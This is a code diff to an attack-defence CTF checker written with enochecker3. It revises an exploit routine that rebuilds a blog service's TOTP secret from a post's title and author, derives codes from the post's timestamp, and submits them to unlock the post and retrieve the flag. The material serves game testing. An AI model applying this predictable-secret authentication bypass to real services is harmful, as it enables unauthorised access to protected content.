@@ -11,6 +11,7 @@ from typing import List, Optional, Tuple
 from bs4 import BeautifulSoup
 from datetime import timezone
 import datetime
+from logging import LoggerAdapter
 
 from enochecker3 import (
     ChainDB,
@@ -64,7 +65,7 @@ class Totp_Client:
         return
 
     def generate_otp(self, shared_secret: bytes, timestep_counter: int):
-        hmac_result = hmac.new(shared_secret, bytes(self.timestep_counter), hashlib.sha1)
+        hmac_result = hmac.new(shared_secret, bytes(timestep_counter), hashlib.sha1)
         bin_code = self.truncate(bytearray(hmac_result.digest()))
         return int(bin_code) % 10**self.num_digits
 
@@ -193,10 +194,11 @@ def find_params(r, username, postid, title):
                 time = spliddy[-2:]
                 el_a = article.find('a', attrs={"class":"action"})
                 post_id = el_a['href'].split('/')[-1]
-                return time, post_id
+                return time, post_id, name
     except: 
         msg = f"post with id {postid} could not be found"
         raise MumbleException(msg)
+
 
 def convert_str_to_unixtimestamp(time):
     #date, timec = timestr.split(' ', 1)
@@ -207,6 +209,7 @@ def convert_str_to_unixtimestamp(time):
     timecomp=timec.split(':')
     #create new aware datetime object from date and time components, note that we do not have seconds.
     dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), tzinfo=timezone.utc)
+    #dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), int(timecomp[2]), tzinfo=timezone.utc)
     return dto.timestamp()
 
 @checker.exploit(0)
@@ -234,23 +237,25 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
 
     #access the index, identify post through unique title and gather necessary infos
     r = await client.get("/", cookies=cookie)
-    postkey = title + username
     # use the title to find relevant info
-    time, post_id = find_params(r, username, postid, title)
+    time, post_id, author = find_params(r, username, postid, title)
+    postkey = str(title) + str(author)
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = convert_str_to_unixtimestamp(time)
+    timestamp = int(convert_str_to_unixtimestamp(time))
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(postkey)
+    totp_device.calculate_current_timestep_count()
     for i in range(2):
-        totp_device = Totp_Client(init_time=timestamp)
-        totp_device.generate_shared_secret(postkey)
-        totp_device.calculate_current_timestep_count()
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
+        logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
         r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
-        #TODO status code is alwyas 200, ned to parse html instead to find out whether the title has become available
-        #if r.status_code == 200:
-         #   break
-
-        #timestamp = int(timestamp) + 30
-
-    assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
-    assert_in(task.flag, r.text, "flag was not found in blogpost")
-    return
+        logger.debug(f"response: {r.text}")
+        html = BeautifulSoup(r.text, "html.parser")
+        body = html.find('p', attrs={"class":"body"})
+        if body is not None:
+            logger.debug(f"paragraph: {body.string}")
+            if flag := searcher.search_flag(r.text):
+                return flag
+    raise MumbleException("Flag not found in exploit")
+    #assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
+    #assert_in(task.flag, r.text, "flag was not found in blogpost")
